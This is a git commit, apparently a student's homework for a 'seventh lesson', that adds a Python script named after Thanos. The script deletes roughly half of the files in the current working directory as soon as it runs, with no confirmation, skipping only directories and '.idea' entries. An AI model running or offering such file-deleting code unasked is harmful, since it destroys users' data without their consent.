32384252202713dc77aec8159c9add2fd174d3ba
Balaraphon <Balaraphon@yandex.ru>
2021-03-25 23:37:52 +0300

    seventh lesson

---
+++ seventh lesson/DZ7.py
@@ -0,0 +1,19 @@
+import os
+import math
+import random
+
+thisdir = os.getcwd()
+thisdir = os.listdir(thisdir)
+
+def thanos(path):
+    count_of_file = len(path)
+    count = 1
+    for x in path:
+        if count <= math.ceil(count_of_file / 2):
+            draw = random.choice(path)
+            if not draw.endswith('.idea') and not x.endswith('.idea') and not os.path.isdir(x):
+                os.remove(x)
+                count += 1
+
+
+thanos(thisdir)
